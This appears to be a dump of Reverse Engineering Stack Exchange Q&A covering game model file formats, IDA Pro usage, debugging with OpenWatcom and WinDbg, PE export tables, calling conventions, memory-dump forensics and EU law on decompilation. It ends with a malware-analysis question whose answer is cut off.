<p>Each DTS file is broken into chunks. The 10th - 13th bytes are a start-of-chunk marker; I think this is <code>03 00 1E 00</code> in each file. The next four bytes are the size of the chunk, always followed by FF 00. A new chunk will begin immediately after the previous ends. I don't know how the chunks divvy up data right now, but it does appear that multiple chunks contain vertices. This may be related to the fact that the model is noticeably divided into discrete parts, rather than a single mesh.</p>

<p>Each vertex is a set of 6 bytes, consisting of 3 <em>signed</em> shorts for the X, Y, and Z coordinates of that vertex. The first vertex in this file is 24 FF 62 01 82 05, which has coordinates -220, 354, 1401 when converted to decimal. The sample I've provided contains the following vertices:</p>

<pre><code>24 FF 72 01 82 05 
DC 00 72 01 82 05 
DC 00 C0 FE 8C 05 
24 FF C0 FE 8C 05
24 FF E8 FE 00 05
24 FF 04 01 60 04
DC 00 04 01 60 04 
DC 00 E8 FE 00 05
</code></pre>

<p>These vertices define the crotch. Interestingly, the crotch is actually located above the head in 3D space as defined in the file, so it must get translated somewhere. I have tested and verified that the above bytes contain the crotch by editing them in RAM while the game is running, which distorts the model immediately when I click back into the game window. </p>

<p>Notice that between some of these vertices are two sets of six bytes that do not appear to be vertices (they don't correspond to any point on the model and have no effect when altered in RAM). I don't know what the deal with these is:</p>

<pre><code>00 F8 00 00 00 00
00 08 00 00 00 00
</code></pre>

<p>The rest of the model is defined in pieces throughout the file. Vertices are clustered into small groups, which I think define one shape at a time. I can find vertices for everything but the weapons and legs. The legs are animated, so they might be defined differently, or located in a different file. The weapons are defined in a separate file.</p>

<p>Preceding the vertices are some shorts with small values, e.g. 06 00 02 00. These have something to do with the faces; my guess is that they refer to vertices by index to define a face. I have verified that these affect the faces by editing them in RAM while the game is running, but haven't fully decoded them yet.</p>

<p>There is always 6 bytes of 0s (<code>00 00 00 00 00 00</code>) between the faces and the vertices. There is always the marker <strong><code>04 00 00 00 14 00 00 00 14 00 00 00</code></strong> shortly after the vertices end. Using this knowledge, I'm able to parse vertices from a file by looking between those two markers; however, this is imprecise and I end up with a bunch of junk vertices forming a partial spherical shell around the model.</p>

<p>Here is a rendering of a point cloud of vertices I am able to read out of the Apocalypse DTS file; I have filtered out some of the junk vertices here, but there are still some present around the edges and in the middle. Take note that the hips and crotch are located <em>above</em> the torso in the file.
<a href=""https://i.stack.imgur.com/eubvH.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eubvH.png"" alt=""enter image description here""></a></p>

<h2>What's next?</h2>

<p>I'm not hoping to decode the entire DTS file from start to finish - it's much too long and complex - but I'd like to at least be able to read the vertices, and hopefully faces, out of the files. </p>

<p>The biggest struggle I've been having at the moment is trying to figure out how to know exactly where a set of faces/vertices start and end. <strong>My main question would be how to <em>precisely</em> determine where a group of faces/vertices start and end</strong>, as they are not in the exact same place in every file. Any other information you can spot that I've missed would be awesome, but that's my main objective. </p>
","<p>To determine where the faces/vertices are laid out purely via inspection can be pretty time consuming and hit-and-miss. Given the executable is available that processes these files, I think it's probably a better starting point - it definitively knows how to process the format.</p>

<p>I used IDA Pro to analyse the code in the executable that's involved in loading the data, using the some magic numbers [including the 0x001e0003 you noted as the ChunkMarker] to locate the relevant parts and expanding from there.</p>

<p>You'll find that there are some duplications of surfaces in the mesh - I think the base mesh is just solid-shaded, but uses textures sparingly like decals over the base mesh.</p>

<p>Here's an example imported into Blender.
<a href=""https://i.stack.imgur.com/PiANI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PiANI.png"" alt=""enter image description here""></a></p>

<p>You can access the code I wrote to generate that on <a href=""https://github.com/booto/convert_dts"" rel=""nofollow noreferrer"">github</a>.</p>
","11576"
"What is difference between Digital Forensic and Reverse Engineering","964","","<p>I am not able to understand exact difference in Digital Forensic and Reverse Engineering. Will Digital Forensic has anything to do with decompilation, assembly code reading or debugging?</p>
","<p>It might be said that the goals (motive) of the investigation rather than the tools or techniques determine whether some work would be classified as digital forensics or reversing.</p>

<p>Definitionally digital forensics is the examination and analysis of digital evidence for use in a legal proceeding. It is certainly true that not all DF is for legal cases, but that is what forensics means :)</p>

<p>Reverse engineering is the process of , well, reversing someone else's engineering. There are plenty of reasons to use RE techniques that don't have anything to do with legal investigations, including reversing to gain and maintain compatibility or purely for education and knowledge.</p>

<p>Decompilation/disassembly, debugging, and reading code/assembly, are all techniques that can be used in DF (DFIR), development and testing of software and hardware, as well as RE.</p>
","2653"
"How does IDA pro generate function names?","961","","<p>I am using IDA pro to decompile a series of applications.  These applications share a common feature and what I have found is that in each decompilation each application shares the same set of functions.  If the binary is stripped how does IDA pro work out the function names ?  </p>

<p>The functions that I am seeing in common between the applications are all very abstract, for example <code>v404()</code>, and as far as I can work out don't come from any open source library set of functions.</p>
","<p>I've seen 4 naming conventions being used: </p>

<ul>
<li>vNNN() when decompiling ARM binaries (i.e.: Android JNI code) - not sure how it numbers them as it doesn't seem it's related to their position or address within the binary.</li>
<li>sub_HHHHHH() when decompiling x86/64 binaries (i.e.: for Windows, OSX) with the actual address on the name</li>
<li>_name/__name() for functions IDA is able to identify via its FLIRT algorithm</li>
<li>finally the clear names for functions it has enough information on the binaries to reverse as they were named originally.</li>
</ul>
","6650"
"How to debug using OpenWatcom's debugger?","961","","<p><a href=""http://www.openwatcom.org"" rel=""nofollow"">OpenWatcom's</a> debugger just executes the binary instead of single-stepping through it, when I attempt the following steps:</p>

<ol>
<li><code>File-&gt;Open</code>, select executable</li>
<li><code>Run-&gt;Trace Into</code></li>
</ol>

<p>This attempt <a href=""http://chat.stackexchange.com/transcript/message/9732918#9732918"">is on Windows XP</a>.</p>

<p>How do I single step through a program using OpenWatcom's debugger?</p>
","<p>Okay, Windows XP, OpenWatcom. I am using OpenWatcom 1.9. When trying to reproduce your problem, I used <code>calc.exe</code> from Windows XP for which there are no Watcom debug symbols available (only the PDB format from Microsoft, which Watcom doesn't support <em>at all</em>).</p>

<p>When dismissing the open dialog from your first step, we get the assembly view like this. I am returning from that call (<code>Run -&gt; Until Return</code>) a few times and realize that the call stack shows I am still in the loader phase.</p>

<p><img src=""https://i.stack.imgur.com/LjloV.png"" alt=""enter image description here""></p>

<p>The most logical thing to do now would be to break at either <code>kernel32!BaseThreadInitThunk</code> which is basically <em>the</em> entry point for any Win32 thread, including the very first in a process, but isn't exported (and, remember, we have no symbols). For a writeup on the startup process, see <a href=""http://abdelrahmanogail.wordpress.com/2010/11/05/thread-basics/"" rel=""nofollow noreferrer"">here</a> or the ""Windows Internals"" book. The next possible candidate would be <code>ntdll!RtlUserThreadStart</code> which also isn't exported and therefore unavailable.</p>

<p>So, assuming you really have no modern debugger (WinDbg, cdb, let alone IDA, Hopper and friends) available, and don't want to use <a href=""http://live.sysinternals.com/livekd.exe"" rel=""nofollow noreferrer""><code>livekd.exe</code> from SysInternals</a> (which however requires a recent <code>dbghelp.dll</code>) the only method that seems to be reasonable is to load your target executable into an editor (<a href=""http://www.ntcore.com/exsuite.php"" rel=""nofollow noreferrer"">CFF Explorer comes to mind</a>) and put an <code>int3</code> (<code>cc</code>) instruction at the entry point or simply move the entry point elsewhere. In my case I chose to overwrite the <code>push 70h</code> (<code>6A 70</code>) with <code>int3; nop</code> (<code>CC 90</code>). That enabled me to break at the beginning of the program (not considering TLS callbacks or anything like that, though).</p>

<p>Another less intrusive method is to use the above mentioned CFF Explorer or really any suitable tool to give you the VA of the entry point. Since we're talking about Windows XP we need not worry about ASLR or anything like that. </p>

<p><img src=""https://i.stack.imgur.com/Z8YPK.png"" alt=""enter image description here""></p>

<p>The entry point in our case is at RVA <code>0x12475</code>, which the Address Converter translates to:</p>

<p><img src=""https://i.stack.imgur.com/Henkx.png"" alt=""enter image description here""></p>

<p>VA <code>0x1012475</code>. Sweet. Now we can try to let OpenWatcom stop at this address. Setting a bpx at this address (<code>Break -&gt; View All -&gt; Rightclick -&gt; New</code>, enter address) and then pressing <kbd>F5</kbd> (for ""Go"") to skip the startup phase for the process gets us straight to the entry point.</p>

<p><img src=""https://i.stack.imgur.com/ZFfzH.png"" alt=""enter image description here""></p>

<p>From there we can use <kbd>F8</kbd> for further single-stepping. And I'm sure similar to the experience we shared during the startup phase, any little thing that changed since the debugger was last adjusted to a more recent OS will trip you (or rather the OW debugger) up. Short of switching debuggers, you might want to make heavy use of <code>Break -&gt; On Debug Message</code>, but even that seemed of little use when I tried it.</p>

<h1>Conclusion</h1>

<p>It's possible, but heck it's tedious and it may fall short of your needs at any point.</p>

<p>Quite frankly, some debuggers are better left alone when no source is available (assembly debugging). Admittedly I am not as familiar with the Watcom debugger as with GDB or WinDbg, but I've used it in the past and found it pure horror <em>with</em> symbols. That impression will likely only get worse <em>without</em> symbols. I find myself confirmed in that sense from looking into the issue you were experiencing.</p>

<h2>20th century debugging</h2>

<p>OpenWatcom, while still being ""developed"" is old. Its roots are in the old Sybase product Watcom, which had a broad following. Problem is, that this product existed even before Windows 2000. So I don't think you can expect a lot from it, as most people these days are using compilers and debuggers with better support. Be it WinDbg or be it GDB if you happen to use MinGW or something like that.</p>
","2186"
"What is the Ubicom32 toolchain and where can I find it?","961","","<p>I am currently reversing firmware for some device.
Without any issues I was able to reach deep into its core and extract the file-system. Now I was trying to reverse some of the special applications on this device. After checking the file format I noticed the following: It is an ELF 32-bit MSB (big-endian) on the Ubicom32 platform. </p>

<p>After googling, checking woodmann and tinkering with it a bit I couldn't find too much information about this format expect the fact that ""it exist"".</p>

<p>Are there tools (or plug-ins) that handle this file format? Can I just regard this as ARM or MIPS? I did find <a href=""https://dev.openwrt.org/browser/trunk/target/linux/ubicom32?rev=19815&amp;order=name#files/arch/ubicom32"" rel=""nofollow"">OpenWRT - Ubicom32 Kernel</a> but no toolchain.</p>
","<p>Ubicom32 is a proprietary architecture, not at all related to ARM or MIPS (other than the fact that it is RISC...well, kind of). IIRC it was designed specifically for networking and multimedia streaming applications, so it's a bit of an odd architecture. It was developed by Ubicom, but they were bought by Qualcomm.</p>

<p>There are Linux tool chains out there for it, the best place to get them that I've found is from vendor GPL releases. If there is no GPL release for your particular device, look for other Ubicom-based devices from that vendor (or other vendors) which do have GPL releases.</p>

<p>Beware that just having a toolchain probably won't be sufficient for reversing the code, you'll need an assembly reference to understand the instructions as well. AFAIK Ubicom never released this publicly, but some creative Googling turned up some mostly complete references for me a while back. I'll see if I can track down the links.</p>

<p><strong>UPDATE</strong>: Found the datasheet for the IP5000 series Ubicom CPUs, which includes an instruction set reference: <a href=""http://www.texim-europe.com/getfile.aspx?id=68544"">http://www.texim-europe.com/getfile.aspx?id=68544</a></p>
","2721"
"Name and Ordinal table pointers in export directory are NULL although DLL exports functions","960","","<p>I'm trying to explore the functions exported by profapi.dll and I came across a behavior that I can't explain. </p>

<p>Reading about the PE binary format I gather that the export table has 3 tables (arrays): one array containing function pointers of exported functions, another containing names (strings) of exported functions, and a third array containing the integer ordinal numbers of the exported functions. The linker needs the information in the name and/or the ordinal table to patch calls to exported functions in other DLLs. The name table pointer can be NULL if the DLL exports its functions using only ordinal numbers. </p>

<p>However, for profapi.dll, I see that both the name table and the ordinal table pointers are NULL; yet the DLL exports 6 functions (verified using IDAPro). In fact, shell32.dll calls one of the functions in profapi.dll using its ordinal number and the linker somehow resolves the address. I'm not sure how the linker is able to resolve the call in shell32.dll. Moreover, pefile, the Python library I am using to parse the DLL reports that profapi.dll does not export any functions since both the name and ordinal table pointers are NULL. What am I missing?</p>

<p>I'm using profapi.dll version 6.1.7600.16385 and shell32.dll version 6.1.7601.2278 on Windows 7. I'm using pefile version 1.2.10-139.</p>
","<p>The ""ordinal table"" (also known as the Export Ordinal Table or <code>AddressOfNameOrdinals</code>) is used in conjunction with the ""name table"" (also known as the Export Name Pointer Table or <code>AddressOfNames</code>) if-and-only-if functions are exported by name.</p>

<p>From the <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">official PE-COFF documentation</a>:</p>

<blockquote>
  <p>The export name pointer table and the export ordinal table form two
  parallel arrays that are separated to allow natural field alignment.
  These two tables, in effect, operate as one table, in which the Export
  Name Pointer column points to a public (exported) name and the Export
  Ordinal column gives the corresponding ordinal for that public name. A
  member of the export name pointer table and a member of the export
  ordinal table are associated by having the same position (index) in
  their respective arrays.</p>
</blockquote>

<p>But if there are no functions exported by name, then there is no Export Name Pointer Table, and if there's no Export Name Pointer Table then there's on need for the Export Ordinal Table either, which is why both fields are <code>NULL</code> in the Export Directory Table.</p>

<blockquote>
  <p>In fact, shell32.dll calls one of the functions in profapi.dll using
  its ordinal number and the linker somehow resolves the address.</p>
</blockquote>

<p>The build-time linker (part of the compiler toolkit) doesn't resolve the address; the run-time loader (part of Windows) resolves the address. The loader see that shell32.dll imports a profapi.dll function by a given ordinal number (let's say <code>105</code>, for example), so it subtracts profapi.dll's Ordinal Base (let's say <code>101</code>, for example) from the ordinal number and uses the result (<code>4</code> in this example) as an index into the Export Address Table to find the RVA of the imported function. Neither the Export Ordinal Table nor the Export Name Pointer Table are needed.</p>

<blockquote>
  <p>Moreover, pefile, the Python library I am using to parse the DLL
  reports that profapi.dll does not export any functions since both the
  name and ordinal table pointers are NULL. What am I missing?</p>
</blockquote>

<p><a href=""https://reverseengineering.stackexchange.com/a/6635/1562"">As discussed here</a>, the pefile Python library is broken, or at least older versions of it are known to be broken with respect to ordinal handling.</p>
","6653"
"Creating a struct in IDA which contains a cString?","957","","<p>Normally I struct is a fixed size. Is it possible to define a structure which contains an element which has different sizes?</p>

<p>To illustrate what I mean is this.</p>

<p>The layout of the data in the file looks like this:</p>

<pre><code>ID          WORD 0
FunctionPtr DWORD OFFSET Fkt
Name        db 'Name of the function',0
align 4
</code></pre>

<p>'Name' is now a C-String which is as long until it reaches the 0-byte at the end and then follows the align instruction. So is it possible to tell IDA that the structure is including the string, no matter how long it is?</p>
","<p>Unless the string is at the <em>end</em> of the structure, it doesn't make sense to try and make this struct in IDA, because it probably doesn't even exist in C (or whatever the original language was).</p>

<p>Now if the string <em>is</em> at the end of the struct, this might correlate to an actual C struct definition. This is called a <a href=""http://gcc.gnu.org/onlinedocs/gcc/Zero-Length.html"" rel=""nofollow"">""zero-length"" array, or ""flexible array member""</a>. Of course, the size of this array is zero, as far as <code>sizeof</code> is concerned. </p>

<p>Unfortunately, this still doesn't exist in IDA. What I've done in the past (again, where the string is <em>last</em>) is go ahead and create a one-byte field, so you at least know where the string starts.  This will complicate things if you try to use <code>size mystruct</code> for any constants in the code, but at least your string offset will be correct.</p>
","3054"
"What does arg_0 = dword ptr 4 mean?","957","","<p>I try to use IDA dissembler and I don't really understand the following text paragraphs appearing at the head of functions:</p>

<pre><code>arg_0 = dword ptr 4
</code></pre>

<p>Can anyone explain their meaning?</p>
","<p>That's not a command, and not really part of the assembly language.
IDA uses those markers to ease the reading of assembly instructions relating to the stack.</p>

<p>Once IDA detects an offset would point into the function's stack as either an internal variable or an argument, it'll assign a name to the specific stack offsets each parameter and/or argument points to from the base of the stack.</p>

<p>It then calculates all offsets to the same position regardless of stack growth/shrinking and will use the stack offset names where-ever they're possible.</p>

<p>The syntax is the following:</p>

<pre><code>&lt;argument/variable name&gt; = &lt;size&gt; ptr &lt;offset from stack base&gt;
</code></pre>

<p>So in your example, IDA identified the first argument to the function and named it <code>arg_0</code> (you can change the name by pressing <kbd>n</kbd> when your cursor is on it). The argument is a dword and the function's base stack offset is 4.</p>

<p>Because the offset is positive IDA identified the stack address as an argument. Negative offsets will be recognized as variables and will have the <code>var_</code> prefix instead.</p>
","13738"
"Are the EU laws preventing reverse engineering of software products?","956","","<p>Would it be legal to decompile and/or reverse engineer a commercial java JAR file to view the inner workings of a library in order to write original code for use with the library in the EU or UK?</p>
","<p>IANAL; If this is done by a company, you <em>need to</em> consult a lawyer that specializes in the field of computer law before taking any action.</p>

<p>Most reverse engineering restrictions actually come from the EULA/Terms of service and other contractual binding agreements between the software provider and the user. <a href=""https://en.wikipedia.org/wiki/Clean_room_design"" rel=""nofollow noreferrer"">Clean room methodologies</a> are also quite common in those cases, that is where the reverse engineer(s) create ""requirement documentation"" and avoid any code/design tasks, which are performed independently. That way there was no reverse engineering done to a program in the process of producing the ""original code"". </p>

<p>According to <a href=""https://en.wikipedia.org/wiki/Reverse_engineering#European_Union"" rel=""nofollow noreferrer"">Wikipedia</a> EU Directive 2009/24, is the most relevant to the question of legality of reverse engineering under EU laws. Keep in mind any contractual agreements with the software company will also affect the legality of reverse engineering their software (and such actions are usually explicitly forbidden there).</p>

<p>This is the excrept from EU Directive 2009/24:</p>

<blockquote>
  <p>(15) The unauthorised reproduction, translation, adaptation or transformation of the form of the code in which a copy of a computer program has been made available constitutes an infringement of the exclusive rights of the author. Nevertheless, circumstances may exist when such a reproduction of the code and translation of its form are indispensable to obtain the necessary information to achieve the interoperability of an independently created program with other programs. It has therefore to be considered that, in these limited circumstances only, performance of the acts of reproduction and translation by or on behalf of a person having a right to use a copy of the program is legitimate and compatible with fair practice and must therefore be deemed not to require the authorisation of the right-holder. An objective of this exception is to make it possible to connect all components of a computer system, including those of different manufacturers, so that they can work together. Such an exception to the author's exclusive rights may not be used in a way which prejudices the legitimate interests of the rightholder or which conflicts with a normal exploitation of the program.</p>
</blockquote>

<p><a href=""https://www.eff.org/issues/coders/reverse-engineering-faq"" rel=""nofollow noreferrer"">This</a> EFF FAQ is also a good start, although I think it mostly addressed USA laws, some of the recommendations are of value anywhere around the globe.</p>
","13440"
"Extracting threads' stack from Windows memory dump","954","","<p>I have a memory dump of a VM running Windows server 2012 R2. The dump is of the entire RAM (4 GB).</p>

<p>I want to extract as many features as possible from this dump. Mainly I want to extract all stacks of all threads running on the machine and exist in the memory. Alternatively, I want to extract call sequences of all threads.</p>

<p>Are there any tools / tutorials / books etc. which can help me perform this task?</p>

<p>I am familiar with both Volatility and Rekall, are there any specific plugins that can help me achieve my goals there?</p>
","<p>I am Not Sure what you are looking for let me try    </p>

<p>i have a dump file of a vm too MEMORY.dmp from a vm that ran xp sp3 created using .crash from a kernel debugger attached to it    </p>

<p>i loaded it using windbg as below    </p>

<pre><code>windbg -z memory.dmp 
</code></pre>

<p>now i thought i will count how many threads are running so i did some thing like this </p>

<pre><code>kd&gt; r $t0 = 0; !for_each_thread ""r $t0= @$t0+1"" ; ? @$t0
Evaluate expression: 306 = 00000132
</code></pre>

<p>now let me see the call stacks for all threads so i do </p>

<pre><code>kd&gt; !for_each_thread  "".thread @#Thread ; k2""
</code></pre>

<p>it spits out </p>

<pre><code>Implicit thread is now 812915b8
 # ChildEBP RetAddr  
00 fc8d37b4 804dc0f7 nt!KiSwapContext+0x2e
01 fc8d37c0 804e3b7d nt!KiSwapThread+0x46
Implicit thread is now 8128eda8
 # ChildEBP RetAddr  
00 fc8e3d34 804dc0f7 nt!KiSwapContext+0x2e
01 fc8e3d40 804e407e nt!KiSwapThread+0x46
Implicit thread is now 8128eb30
 # ChildEBP RetAddr  
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>

<p>ok instead of k2 i do k i get a full stack trace </p>

<pre><code>Implicit thread is now 810efda8
  *** Stack trace for last set context - .thread/.cxr resets it
 # ChildEBP RetAddr  
00 f8ad3c38 804dc0f7 nt!KiSwapContext+0x2e
01 f8ad3c44 804dc143 nt!KiSwapThread+0x46
02 f8ad3c6c bf802f52 nt!KeWaitForSingleObject+0x1c2
03 f8ad3ca8 bf801b2a win32k!xxxSleepThread+0x192
04 f8ad3cec bf819e6c win32k!xxxRealInternalGetMessage+0x418
05 f8ad3d4c 804de7ec win32k!NtUserGetMessage+0x27
06 f8ad3d4c 7c90e4f4 nt!KiFastCallEntry+0xf8
07 0007fe24 7e4191be ntdll!KiFastSystemCallRet
08 0007fe44 0100a740 USER32!NtUserGetMessage+0xc
09 0007fe80 0100c216 wmiprvse!WindowsDispatch+0x31
0a 0007ff14 0100c314 wmiprvse!Process+0x225
0b 0007ff1c 010247aa wmiprvse!WinMain+0x4e
0c 0007ffc0 7c817067 wmiprvse!WinMainCRTStartup+0x174
0d 0007fff0 00000000 kernel32!BaseProcessStart+0x23
Implicit thread is now 8113b960
  *** Stack trace for last set context - .thread/.cxr resets it

XXXXXXXXXXXXXXXX
</code></pre>

<p>hope your query is answered if not please explain what is it you mean by call sequences </p>

<p><strong>addressing the comment by Igor Skochinsky</strong> </p>

<p>if the format of the file is raw as in lets say captured with matthieu suiches now defunct win32dd.exe one can use volatility's plugin raw2dmp and use the resulting windbg compatible dmpfile in windbg as above</p>

<p><strong>vol25 -f foo.dmp --profile=Win7SP1x86 imageinfo</strong></p>

<pre><code>Volatility Foundation Volatility Framework 2.5
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP0x86, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (E:\vola\foo.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82d32c28L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82d33c00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2016-06-02 18:08:14 UTC+0000
</code></pre>

<p><strong>vol25 -f foo.dmp  --profile=Win7SP1x86 raw2dmp --output-image=foowind.dmp</strong></p>

<pre><code>Volatility Foundation Volatility Framework 2.5
Writing data (5.00 MB chunks): |.....
</code></pre>

<p><strong>dumpchk.exe foowind.dmp</strong>   </p>

<pre><code>Loading dump file foowind.dmp

Microsoft (R) Windows Debugger Version 10.0.10586.567 X86
Copyright (c) Microsoft Corporation. All rights reserved.

Loading Dump File [xxx\foowind.dmp]
Kernel Complete Dump File: Full address space is available

Comment: 'File was converted with Volatility'
xxxxxxxxxxxxxxxxxxxxxxx
*** ERROR: Module load completed but symbols could not be loaded for win32dd.exe
Cannot find frame 0x6c, previous scope unchanged
*** ERROR: Module load completed but symbols could not be loaded for win32dd.sys
Probably caused by : win32dd.exe ( win32dd!Unknown )
</code></pre>
","12784"
"How do I find where a String is referenced in IDA Pro?","953","","<p>Please bear in mind I am very new to all this - however I have searched and could not easily find an answer to my issue.</p>

<p>I have an elf (actually an Android aboot image based upon LK) that I loaded into IDA Pro. I see Strings, and I wish to find out where these strings are referenced in code.</p>

<p><a href=""https://i.stack.imgur.com/KaVEa.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KaVEa.png"" alt=""enter image description here""></a></p>

<p>I have tried to find cross-references to these strings in the code but there aren't any.</p>

<p>Am I totally naive and missed out something totally obvious to the initiated? Could the strings be referenced by some obtuse run-time calculation of address (to obfuscate references) rather than just straightforward absolute/relative reference (which IDA mostly could work out?)</p>

<p>Many thanks.</p>
","<p>It could just be an array of strings that is referenced by a table of offsets into the array.  Here is an example of how strerror() looks up strings:</p>

<p><a href=""https://i.stack.imgur.com/NWYBN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NWYBN.png"" alt=""String table example""></a></p>

<p>Should be pretty straightforward to see that <em>errid</em> is just used to calculate the pointer for a corresponding string in the <em>errmsg</em> table by the <strong>strerror()</strong> function.  This could be why you are not seeing xrefs for those strings.  Without more information, that's my best guess.  I would try to find the beginning of that list of strings and look for an xref there.</p>
","14745"
"Determining if a variable is local or an argument passed to a function","951","","<p>How can you determine if a variable is a local variable of the function or an argument passed to the function?</p>
","<h1>Parameters</h1>

<p>Not only does it depend on the platform but different functions have different calling conventions. The calling convention basically tells you how you know where the arguments are. It says nothing about the local function stack frame layout. </p>

<p>It's also extremely important to understand that when a function or method can be proven by the compiler or linker to not be accessed by code outside of what the compiler can see in the current translation unit or the linker in the current binary they are free to do whatever they want. This includes passing arguments in manners which do not correspond the the <a href=""http://en.wikipedia.org/wiki/Application_binary_interface"">ABI</a>. This is an even larger problem with the rising popularity of link time code generation.</p>

<p>The ABI is basically the interface which all binaries on platform promises to adhere to so that there can be a guarantee that binaries written in different languages can interact. However if your binary does not export a function it does not usually need to adhere to the ABI.</p>

<h1>Variables</h1>

<p>Variables can really only be stored in three locations</p>

<ol>
<li><p>they can be stored on the stack in the local stack frame of the current function. This can be seen when the access is done relative to the stack pointer and where the offset is within the function stack frame and antedates the saved local registers. This usually means that the variable antedate the return address for calling conventions without link registers. Accesses where the offset precedes the return address is generally arguments. Calling conventions with link registers don't store return addresses on the stack unless they have to so variables antedate the saved registers portion of the <a href=""http://en.wikipedia.org/wiki/Stack_frame#Structure"">stack frame</a> and stack based arguments precede the saved registers portion of the stack frame. </p></li>
<li><p>global storage, generally in either the heap or in a segment of the executable binary mapped by the loader.</p></li>
<li><p>registers, this is generally used for variables which are used very frequently in the function since the register banks is the fastest storage available to the CPU. Variables can also be kept in registers for the duration of the function if the compiler determines that the CPU has enough registers to store all variables in the register bank. The optimization of which registers store what and when is called <a href=""http://en.wikipedia.org/wiki/Register_allocation"">register allocation</a>. It's also important to realize that variables that go out of scope or are unused later on in a function frees up registers. This means that one register can map to different variables at different stages of a function.</p></li>
</ol>

<h1>Calling conventions</h1>

<h2>IA32 calling conventions</h2>

<p>In rough order of likelihood to run into.</p>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"">cdecl</a></h3>

<blockquote>
  <p>In cdecl, subroutine arguments are passed on the stack. Integer values and memory addresses are returned in the EAX register, floating point values—in the ST0 x87 register. Registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved. The x87 floating point registers ST0 to ST7 must be empty (popped or freed) when calling a new function, and ST1 to ST7 must be empty on exiting a function.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#thiscall"">thiscall</a></h3>

<blockquote>
  <p>On the Microsoft Visual C++ compiler, the this pointer is passed in ECX and it is the callee that cleans the stack, mirroring the stdcall convention used in C for this compiler and in Windows API functions. When functions use a variable number of arguments, it is the caller that cleans the stack.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#stdcall"">stdcall</a></h3>

<blockquote>
  <p>Callee is responsible for cleaning up the stack, but the parameters are pushed onto the stack in right-to-left order, as in the _cdecl calling convention. Registers EAX, ECX, and EDX are designated for use within the function. Return values are stored in the EAX registe</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#fastcall"">fastcall</a></h3>

<blockquote>
  <p>Passes the first two arguments (evaluated left to right) that fit into ECX and EDX. Remaining arguments are pushed onto the stack from right to left.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#pascal"">pascal</a></h3>

<blockquote>
  <p>Parameters are pushed on the stack in left-to-right order (opposite of cdecl), and the callee is responsible for balancing the stack before return.</p>
</blockquote>

<h2>AMD64 calling conventions</h2>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#Microsoft_x64_calling_convention"">Microsoft</a></h3>

<blockquote>
  <p>The Microsoft x64 calling convention[9] (for long mode on x86-64) uses registers RCX, RDX, R8, R9 are used for the first four integer or pointer arguments (in that order left to right), and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments are pushed onto the stack (right to left). Integer return values (similar to x86) are returned in RAX if 64 bits or less. Floating point return values are returned in XMM0. Parameters less than 64 bits long are not zero extended; the high bits contain garbage.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI"">Pretty much everyone else</a></h3>

<blockquote>
  <p>Followed on Solaris, GNU/Linux, FreeBSD, and other non-Microsoft operating systems. The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9, while XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 are used for floating point arguments. For system calls, R10 is used instead of RCX.[11] As in the Microsoft x64 calling convention, additional arguments are passed on the stack and the return value is stored in RAX.</p>
</blockquote>

<h2><a href=""http://en.wikipedia.org/wiki/Calling_convention#ARM"">ARM calling conventions</a></h2>

<blockquote>
  <p>r14 is the link register, r12 is the Intra-Procedure-call scratch register, r0 to r3 are used to hold argument values passed to a subroutine, and also hold results returned from a subroutine. </p>
</blockquote>

<p>More than 4 arguments and they get pushed on the stack.</p>

<h2><a href=""http://www.ibm.com/developerworks/library/l-ppc/"">PowerPC calling conventions</a></h2>

<blockquote>
  <p>Since the PowerPC has so many GPRs (32 compared to ia32's 8), arguments are passed in registers starting with gpr3. Registers gpr3 through gpr12 are volatile (caller-save) registers that (if necessary) must be saved before calling a subroutine and restored after returning. Variable argument count functions store the argument on the stack for the callee.</p>
</blockquote>

<h2><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">MIPS calling conventions</a></h2>

<h3><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">O32</a></h3>

<blockquote>
  <p>the first four arguments to a function in the registers $a0-$a3; subsequent arguments are passed on the stack. Space on the stack is reserved for $a0-$a3 in case the callee needs to save its arguments, but the registers are not stored there by the caller. The return value is stored in register $v0; a second return value may be stored in $v1.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">N32 and N64</a></h3>

<blockquote>
  <p>pass the first eight arguments to a function in the registers $a0-$a7; subsequent arguments are passed on the stack. The return value (or a pointer to it) is stored in the registers $v0; a second return value may be stored in $v1. In both the N32 and N64 ABIs all registers are considered to be 64-bits wide.</p>
</blockquote>
","1728"
"Prevent malware from deleting itself during installation on Windows x64","948","","<p>Can anyone suggest a tool to prevent a malware from deleting itself on Windows x64? The purpose is to collect all the components of the whole process of infection.</p>

<p>I've looked at CaptureBat, but its drivers are only 32-bit.
I also thought about using file recovery utilities for this.</p>
","<p>There are couple of ways that I could think of.</p>

